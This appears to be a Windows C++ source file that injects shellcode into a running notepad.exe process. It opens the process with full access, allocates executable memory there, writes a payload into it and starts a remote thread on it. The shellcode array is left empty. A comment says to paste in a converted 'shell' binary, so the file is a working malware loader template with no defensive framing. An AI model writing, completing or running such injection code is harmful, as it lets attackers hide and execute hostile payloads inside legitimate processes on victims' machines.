#pragma comment(lib, "wininet")
#include<Windows.h>
#include<WinInet.h>
#include <tlhelp32.h>


#include<iostream>
using namespace std;



HANDLE find_notepad_process() {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	BOOL cont = Process32FirstW(hSnapshot, &pe32);
	BOOL notepad = FALSE;
	wchar_t str_target[100] = L"notepad.exe";
	while (cont) {
		DWORD result = wcscmp(pe32.szExeFile, str_target);
		//DWORD result = 1;
		//if (pe32.th32ProcessID == 2372) result = 0;
		if (!result) {
			wcout << "ID:" << pe32.th32ProcessID << '\t' << pe32.szExeFile << '\n';
			notepad = TRUE;
			HANDLE hNotepad = OpenProcess(
				PROCESS_ALL_ACCESS
				, FALSE, pe32.th32ProcessID);
			if (!hNotepad) {
				cout << "OpenProcess Err:" << GetLastError() << '\n';
				return NULL;
			}//end if err
			return hNotepad;
		}//end if result

		cont = Process32NextW(hSnapshot, &pe32);

	}//end while
	if (!notepad) {
		return NULL;
	}
	CloseHandle(hSnapshot);
}
int main() {
	unsigned char shellcode[] ={}//use pe_to_shellcode to convert shell.cpp then past binary to this char array
	HANDLE notepad_process = find_notepad_process();
	if (!notepad_process) {
		cout << "i need notepad process\n";
		getchar();
		return 0;
	}

	DWORD sizeofPayload = sizeof(shellcode);
	void* remoteBuf = VirtualAllocEx(notepad_process, NULL,
		sizeofPayload,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	cout << "remoteBuf:" << remoteBuf << '\n';
	WriteProcessMemory(notepad_process,
		remoteBuf,
		shellcode,
		sizeofPayload,
		NULL
	);

	HANDLE remoteThread = CreateRemoteThread(notepad_process, NULL, 0,
		(LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
	//==========END==========
	cout << "Ok\n";
	CloseHandle(notepad_process);
	return 0;
}
